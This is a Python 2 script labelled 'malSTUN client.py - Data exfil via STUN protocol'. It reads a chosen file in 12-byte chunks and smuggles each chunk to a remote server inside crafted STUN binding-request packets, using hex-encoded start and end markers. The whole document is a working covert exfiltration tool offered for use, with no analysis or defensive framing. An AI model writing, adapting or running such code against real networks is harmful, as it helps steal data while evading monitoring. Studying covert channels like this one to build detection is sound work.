#!/usr/bin/env python
# coding: utf-8
# Use at your own risk

import socket
import binascii
import argparse
import time

LOCAL_IP = '0.0.0.0'
LOCAL_PORT = 28101
MAGIC_COOKIE = '\x21\x12\xA4\x21'
PAYLOAD_START = "53544152542046494c452e2e"
PAYLOAD_END = "454e442046494c452e2e2e2e"
DELAY = 0.01
PACKET_COUNT = 0


def filehandler():
    transfer = open(INFILE, 'rb')
    payload = binascii.a2b_hex(''.join(PAYLOAD_START))
    stun(payload)
    l = transfer.read(12)
    while l:
        payload = l
        stun(payload)
        l = transfer.read(12)
        time.sleep(DELAY)
    payload = binascii.a2b_hex(''.join(PAYLOAD_END))
    stun(payload)
    print """
    Complete!
    Sent %s STUN packets!
    ***************************************""" % PACKET_COUNT


def stun(payload):
    packet = ''.join(['\x00\x01', '\x00\x00', MAGIC_COOKIE, payload])
    sock.sendto(packet, (STUN_SERVER, STUN_PORT))
    global PACKET_COUNT
    PACKET_COUNT += 1


if __name__ == '__main__':
    parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter,
                                     description="malSTUN client.py - Data exfil via STUN protocol")
    parser.add_argument('-s', '--server', required=True, help='STUN Server Address')
    parser.add_argument('-p', '--port', required=True, help='STUN Server Port')
    parser.add_argument('-f', '--file', required=True, help='File to send')
    args = vars(parser.parse_args())
    STUN_SERVER = args['server']
    STUN_PORT = int(args['port'])
    INFILE = args['file']
    print """
    ***************************************
    Running client.py!
    ***************************************
    * STUN Server Address: %s:%s
    * Binding (local): %s:%s
    * File to transfer: %s
    * STUN packet delay (seconds): %s
    ***************************************""" % (STUN_SERVER, STUN_PORT, str(LOCAL_IP), str(LOCAL_PORT), INFILE, DELAY)
    socket.setdefaulttimeout(10)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((LOCAL_IP, LOCAL_PORT))
    filehandler()
    sock.close()
